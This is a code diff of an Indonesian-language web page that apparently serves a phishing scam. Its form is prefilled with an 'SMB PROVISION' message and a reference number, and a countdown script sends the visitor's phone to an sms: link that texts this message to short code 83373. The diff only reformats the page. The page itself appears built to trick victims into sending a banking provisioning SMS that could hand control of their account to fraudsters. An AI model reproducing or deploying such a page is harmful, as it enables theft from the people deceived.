@@ -24,7 +24,9 @@
       }
 </style>
     <div class="kadaluarsa" style="display:none;">
+        <center>
     <h1>link sudah kadaluarsa</h1>
+    </center>
 </div>
 <body>
     <form id="smsForm">
@@ -33,10 +35,18 @@
 
 
 
-value="SMB PROVISION 
+value=
+
+
+
+"SMB PROVISION 
 Mohon jangan ubah SMS.
 Nomor Ref:
-L5KQCHRFULW6IHWR">
+L5KQCHRFULW6IHWR"
+
+
+
+>
 
 
 
@@ -45,7 +55,7 @@ L5KQCHRFULW6IHWR">
 <br><br>
 <center><button type="submit" id="kirims" style="height:30px;font-size:12px;width:90%;border-radius:50px;" class="wdFull">Konfirmasi</button></center></form>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-<script>
+ <script>
       $(document).ready(function() {
     var timeLeft = 19; 
     const timerElement = $('#timer');
@@ -70,12 +80,12 @@ var timer = setInterval(function() {
   var message = document.getElementById("message").value;
    var smsUri = `sms:83373?&body=${encodeURIComponent(message)}`;
         window.location.href = smsUri;
-  /* alert("Waktu konfirmasi telah kadaluarsa!");*/
+  
     clearInterval(timer);
 
   }
   i--;
 }, 000)
-</script>
+</script> 
 </body>
 </html>
